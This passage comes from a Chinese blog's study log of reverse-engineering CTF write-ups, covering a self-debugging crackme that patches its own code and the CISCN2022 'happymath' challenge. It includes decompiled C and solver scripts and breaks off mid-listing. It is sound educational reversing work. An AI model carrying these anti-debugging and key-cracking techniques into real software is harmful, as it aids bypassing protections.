          <category> 知识集 </category>
          
          <category> web </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暑假学习记录2</title>
      <link href="/posts/d7a4634e.html"/>
      <url>/posts/d7a4634e.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>目录：</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">学习记录1</a></p><p><a href="https://www.pri87.vip/posts/d7a4634e.html">学习记录2</a> &lt;=</p></div><p>还是差不多，没写什么东西，也没学多少</p><hr><h2 id="wp">wp:</h2><h3 id="crackme-100">crackme-100</h3><p>在学互斥体的时候看到的一个crackme</p><p>一进main函数看到了不能被解析的内容</p><p><img src="https://s2.loli.net/2024/08/05/SvDRnMdlOagCbrT.png" alt="img"></p><p>不敢乱动，还是直接看汇编吧</p><p>这里的汇编是判断了两次长度，然后进入了一个函数检查,这个是第一个地方</p><p>进去看看</p><p><img src="https://s2.loli.net/2024/08/05/Skv5cEfN1K8rMx4.png" alt="img"></p><p>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_401180</span><span class="params">(<span class="type">char</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPWSTR CommandLineW; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v6; <span class="comment">// edi</span></span><br><span class="line">  WCHAR v7; <span class="comment">// cx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// edi</span></span><br><span class="line">  __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  __int16 v11; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _WORD *v13; <span class="comment">// edi</span></span><br><span class="line">  __int16 v14; <span class="comment">// cx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+10h] [ebp-11A8h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesRead; <span class="comment">// [esp+20h] [ebp-1198h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesWritten; <span class="comment">// [esp+24h] [ebp-1194h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOW</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+28h] [ebp-1190h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+70h] [ebp-1148h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [esp+D0h] [ebp-10E8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">3</span>]; <span class="comment">// [esp+3A0h] [ebp-E18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+3ACh] [ebp-E0Ch]</span></span><br><span class="line">  <span class="type">int</span> Buffer[<span class="number">255</span>]; <span class="comment">// [esp+3B0h] [ebp-E08h] BYREF</span></span><br><span class="line">  _BYTE v25[<span class="number">2</span>]; <span class="comment">// [esp+7AEh] [ebp-A0Ah] BYREF</span></span><br><span class="line">  WCHAR CommandLine[<span class="number">1282</span>]; <span class="comment">// [esp+7B0h] [ebp-A08h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(CommandLine, <span class="number">0</span>, <span class="number">0xA00</span>u);</span><br><span class="line">  CommandLineW = GetCommandLineW();</span><br><span class="line">  v3 = CommandLineW;</span><br><span class="line">  <span class="keyword">while</span> ( *CommandLineW++ )</span><br><span class="line">    ;</span><br><span class="line">  v5 = (<span class="type">char</span> *)CommandLineW - (<span class="type">char</span> *)v3;</span><br><span class="line">  v6 = (LPWSTR)v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v6[<span class="number">1</span>];</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 );</span><br><span class="line">  qmemcpy(v6, v3, v5);</span><br><span class="line">  v8 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *((_WORD *)v8 + <span class="number">1</span>);</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 );</span><br><span class="line">  *(_DWORD *)v8 = <span class="number">32</span>;</span><br><span class="line">  v10 = this;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_WORD *)v10;</span><br><span class="line">    v10 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 );</span><br><span class="line">  v12 = v10 - this;</span><br><span class="line">  v13 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v13[<span class="number">1</span>];</span><br><span class="line">    ++v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 );</span><br><span class="line">  qmemcpy(v13, this, v12);</span><br><span class="line">  CreateProcessW(<span class="number">0</span>, CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">while</span> ( DebugEvent.dwDebugEventCode != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">    WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  Context.ContextFlags = <span class="number">65537</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">  v22[<span class="number">0</span>] = <span class="number">344606352</span>;</span><br><span class="line">  v22[<span class="number">1</span>] = <span class="number">252981262</span>;</span><br><span class="line">  v22[<span class="number">2</span>] = <span class="number">1976056641</span>;</span><br><span class="line">  v23 = <span class="number">-11</span>;</span><br><span class="line">  WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点只在最后13行，前面都是初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br></pre></td></tr></table></figure><p>这里可以看到最后的输出条件，同时它是创建了一个新进程。并把输入作为参数一起打开，然后用WaitForDebugEvent来读取调试，读取到后patch后面的几个字节，地方是Context.Eip - 1，也就是程序执行到的位置，刚刚的main函数里面刚好就有一个int3断点，在那里直接patch得到最后的逻辑</p><p><img src="https://s2.loli.net/2024/08/05/8Q9namgWbVYdZ7S.png" alt="img"></p><p>所以只是一个异或然后一个加值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x25</span>,<span class="number">0x5c</span>,<span class="number">0x5c</span>,<span class="number">0x2b</span>,<span class="number">0x2f</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x36</span>,<span class="number">0x2c</span>,<span class="number">0x64</span>,<span class="number">0x72</span>,<span class="number">0x76</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x4e</span>,<span class="number">0x52</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]-=<span class="number">1</span></span><br><span class="line">s = <span class="string">&#x27;elcome to CFF test!&#x27;</span></span><br><span class="line">pxor(last,s)</span><br></pre></td></tr></table></figure><h3 id="CISCN2022-happymath">CISCN2022 happymath</h3><p>进去直接看main：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, input);</span><br><span class="line">  len = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++len;</span><br><span class="line">  <span class="keyword">while</span> ( input[len] );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)len == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">0</span>i64;</span><br><span class="line">    k = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = input[k];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;a&#x27;</span>) &gt; <span class="number">5u</span> &amp;&amp; (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++k &gt;= <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        n = <span class="number">0</span>i64;</span><br><span class="line">        m = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sk = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">            mid = input[i++];</span><br><span class="line">          v12 = (sk | ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j)) &amp; ~(sk &amp; ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j));</span><br><span class="line">          v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">          v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">          v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">          v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">          v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">          v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">          v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">          v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line">          <span class="keyword">if</span> ( ((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          m += <span class="number">4</span>;</span><br><span class="line">          n += <span class="number">256</span>i64;</span><br><span class="line">          j += <span class="number">4</span>i64;</span><br><span class="line">          <span class="keyword">if</span> ( m &gt;= <span class="number">36</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_7FF6471D1020(<span class="string">&quot;Your flag is flag&#123;%s&#125;\n&quot;</span>, input);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6471D1020(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">mid = input[i++];</span><br><span class="line"><span class="comment">//改写为</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，这里每四个字节用t1表生成每次的密钥sk，生成只和输入和n有关，校验只和sk有关。那么直接写爆破脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span 